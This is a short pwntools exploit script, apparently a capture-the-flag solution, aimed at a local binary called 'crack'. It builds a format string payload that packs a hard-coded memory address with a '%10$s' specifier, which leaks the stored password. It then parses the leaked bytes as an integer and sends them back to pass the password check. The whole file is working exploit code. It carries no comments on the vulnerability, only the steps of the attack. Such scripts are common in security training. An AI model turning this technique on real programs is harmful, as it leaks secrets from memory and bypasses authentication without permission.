from pwn import *
# context.log_level = "debug"

p = process("crack")

offset = 10
password_addr = 0x0804A048
p.recvuntil("? ")
# leak password
payload = p32(password_addr) + "#%" + str(offset) + "$s#"
p.send(payload)
# get password from recv
p.recvuntil("#")
text = p.recvuntil("#")
password = u32(text[:4])
p.recvuntil(":")
# send password in dec
p.sendline(str(password))
print p.recv()
